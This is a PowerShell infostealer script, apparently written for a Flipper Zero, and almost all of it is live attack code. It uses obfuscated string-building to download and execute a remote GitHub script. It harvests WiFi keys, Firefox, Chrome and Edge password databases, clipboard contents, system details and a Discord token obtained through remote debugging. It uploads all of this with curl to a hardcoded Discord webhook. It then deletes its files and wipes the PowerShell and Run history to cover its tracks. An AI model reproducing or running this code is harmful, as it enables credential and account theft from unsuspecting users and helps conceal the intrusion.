# Define function aliases and URL placeholders
$n='i'; set-alias v $n'wr'; 
$b=[char]116; $c=[char]47; 
$a=$([char]104+$b+$b+[char]112+[char]58+$c+$c); 
IEX (v -usebasicparsing $a'raw.githubusercontent.com/s4dic/DiscordGrabber/main/bd.ps1?token=GHSAT0AAAAAABXCYHCCGGWFF43MHDED24HEYXT6JBQ'); 

# Adjust webhook URL to your specific endpoint
$url="https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovPTEoI8MVsRDikLkYZr1tUTuHNohr-A6ljyvd3MRRGwmI8ehOo";

# Get PC details (ComputerName, UserName, Timestamp)
$namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S";

# Prepare and clear output logs
$statFile = "$env:temp\stats-$namepc.txt";
echo "####PC Stats and Info####" > $statFile;

# Get clipboard contents
echo "#### PC Clipboard ####" >> $statFile;
Get-Clipboard >> $statFile;

# Capture WiFi passwords
$wifiFile = "$env:temp\WIFI-$namepc.txt";
(netsh wlan show profiles) | Select-String "\:(.+)$" | % {
    $name=$_.Matches.Groups[1].Value.Trim(); 
    netsh wlan show profile name="$name" key=clear 
} | Out-File $wifiFile;

# Take screenshot
cd "$env:temp";
echo 'function Get-ScreenCapture {' > "d.ps1";
echo '    Add-Type -AssemblyName System.Drawing, System.Windows.Forms;' >> "d.ps1";
echo '    $bitmap = [Windows.Forms.Clipboard]::GetImage();' >> "d.ps1";
echo '    $bitmap.Save("$env:temp\$env:UserName-Capture.jpg");' >> "d.ps1";
echo '}' >> "d.ps1";
powershell -ExecutionPolicy Bypass -File $env:temp\d.ps1;

# Kill Discord and restart with remote debugging to grab the token
taskkill /IM Discord.exe /F;
gci $env:appdata\..\local\Discord\app-* | ? { $_.PSIsContainer } | sort CreationTime -desc | select -f 1 | cd;
.\Discord.exe --remote-debugging-port=9222;

# Gather environment variables and IP info
dir env: >> $statFile;
$pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content;
echo "PUBLIC IP: $pubip" >> $statFile;
ipconfig /all >> $statFile;

# Gather installed software information
echo "#### Installed Software ####" >> $statFile;
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | 
    Format-Table -AutoSize >> $statFile;
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | 
    Format-Table -AutoSize >> $statFile;

# Browser Data Collection and Fix for Edge
# Get Firefox Passwords
$key4 = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include key4.db -Recurse -ErrorAction SilentlyContinue | % { $_.fullname };
$logins = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname };
$firefoxpassword = "$env:temp\Firefox-Password-$namepc.zip";
Compress-Archive -Path $key4, $logins -DestinationPath $firefoxpassword -Force;

# Get Chrome Passwords
$chromeData = "$env:appdata\..\local\Google\Chrome\User Data";
$chromeFiles = "$chromeData\Local State", "$chromeData\default\Login Data", "$chromeData\default\Preferences";
$chromepassword = "$env:temp\Chrome-Password-$namepc.zip";
Compress-Archive -Path $chromeFiles -DestinationPath $chromepassword -Force;

# Get Edge Passwords - Fixed and optimized
$edgeData = "$env:appdata\..\Local\Microsoft\Edge\User Data";
$edgeFiles = "$edgeData\Local State", "$edgeData\default\Login Data", "$edgeData\default\Preferences";
$edgepassword = "$env:temp\Edge-Password-$namepc.zip";
Compress-Archive -Path $edgeFiles -DestinationPath $edgepassword -Force;

# Backup Edge folder and reset it to simulate fresh user behavior
taskkill /IM msedge.exe /F;
Move-Item -Path $env:appdata\..\Local\Microsoft\Edge -Destination $env:appdata\..\Local\Microsoft\ZZZZZZZ;

# Pause to allow FlipperZero to interact and collect token
Start-Sleep 60;

# Get token from clipboard
$token = Get-Clipboard;

# Logging Discord token
echo "#### Discord Token ####" >> $statFile;
echo $token >> $statFile;

# Token Screenshot Backup (in case clipboard fails)
echo 'function Get-ScreenCapture {' > "d.ps1";
echo '    Add-Type -AssemblyName System.Drawing, System.Windows.Forms;' >> "d.ps1";
echo '    $bitmap = [Windows.Forms.Clipboard]::GetImage();' >> "d.ps1";
echo '    $bitmap.Save("$env:temp\$env:UserName-Token_Capture.jpg");' >> "d.ps1";
echo '}' >> "d.ps1";
powershell -ExecutionPolicy Bypass -File $env:temp\d.ps1;

# Prepare data for exfiltration (via Discord webhook)
$Body=@{ content = "**Flipper-Zero Stats from PC:** $env:UserName, $env:computername" };
Invoke-RestMethod -Uri $url -Method Post -Body ($Body | ConvertTo-Json);

# Uploading stats, WiFi passwords, browser passwords, and screenshots
curl.exe -F "file=@$statFile" $url;
curl.exe -F "file=@$wifiFile" $url;
curl.exe -F "file=@$firefoxpassword" $url;
curl.exe -F "file=@$chromepassword" $url;
curl.exe -F "file=@$edgepassword" $url;
curl.exe -F "file=@$env:temp\$env:UserName-Capture.jpg" $url;
curl.exe -F "file=@$env:temp\$env:UserName-Token_Capture.jpg" $url;

# Clean up: Delete all evidence and restore original configurations
taskkill /IM Discord.exe /F;
Remove-Item -Path $statFile, $wifiFile, $firefoxpassword, $chromepassword, $edgepassword -Force;
Remove-Item -Path $env:temp\*.ps1 -Force;
Move-Item -Path $env:appdata\..\Local\Microsoft\ZZZZZZZ -Destination $env:appdata\..\Local\Microsoft\Edge;

# Clear PowerShell history and run history from the registry
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Force;

# Exit the script
exit;
